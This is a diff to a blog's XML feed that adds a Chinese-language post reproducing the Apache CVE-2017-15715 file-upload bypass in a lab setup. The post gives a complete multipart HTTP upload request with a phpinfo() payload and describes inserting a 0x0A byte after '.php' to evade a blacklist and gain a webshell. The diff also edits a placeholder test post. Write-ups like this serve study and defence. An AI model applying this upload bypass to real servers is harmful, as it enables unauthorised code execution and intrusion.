@@ -17,11 +17,36 @@
     
     
     <entry>
-      <title>tes</title>
+      <title>apache 文件上传 (CVE-2017-15715)漏洞复现</title>
+      <link href="/2023/12/24/1/"/>
+      <url>/2023/12/24/1/</url>
+      
+        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache(音译为阿帕奇)是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。 此漏洞的出现是由于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php 时 xxx.php\x0A 将被按照 php 后缀进行解析，导致绕过一些服务器的安全策略。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Apache HTTPd 2.4.0~2.4.29</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1、打开靶场抓包"><a href="#1、打开靶场抓包" class="headerlink" title="1、打开靶场抓包"></a>1、打开靶场抓包</h3><p><img src="/../images/image-20241206001945659-1746697283255-1.png" alt="image-20241206001945659"></p><p>发现响应包中</p><p><img src="/../images/image-20241206002014830-1746697283256-2.png" alt="image-20241206002014830"></p><p>存在apache解析漏洞，可以绕过php黑名单</p><h3 id="2、上传木马"><a href="#2、上传木马" class="headerlink" title="2、上传木马"></a>2、上传木马</h3><p>写一个数据包上传木马</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ip:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------9552222486401230933854482358</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>361</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">9552222486401230933854482358</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;1.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">9552222486401230933854482358</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;name&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="number">1</span>.php</span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">9552222486401230933854482358</span>--</span></span><br></pre></td></tr></table></figure><p>响应</p><p><img src="/../images/image-20241206002752180-1746697283256-3.png" alt="image-20241206002752180"></p><p>上传失败</p><h3 id="3、利用漏洞"><a href="#3、利用漏洞" class="headerlink" title="3、利用漏洞"></a>3、利用漏洞</h3><p>修改1.php的hex为0a</p><p><img src="/../images/image-20241206003023292-1746697283256-4.png" alt="image-20241206003023292"></p><p>插入0a,效果如下</p><p><img src="/../images/image-20241206003127216-1746697283256-5.png" alt="image-20241206003127216"></p><p>木马成功上传</p><p>可以拿到webshell</p><p><img src="/../images/image-20241206004426322-1746697283256-6.png" alt="image-20241206004426322"></p><p>漏洞复现完成</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CVE </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>test</title>
       <link href="/2017/12/24/tes/"/>
       <url>/2017/12/24/tes/</url>
       
-        <content type="html"><![CDATA[<p>title: test<br>date: 2017-12-24 23:29:53<br>tags:</p><ul><li>Foo</li><li>Bar<br>categories: </li><li>Baz</li></ul><hr><p><img src="/../images/image-20250508160155106.png"></p>]]></content>
+        <content type="html"><![CDATA[<p> 测试</p>]]></content>
       
       
       <categories>
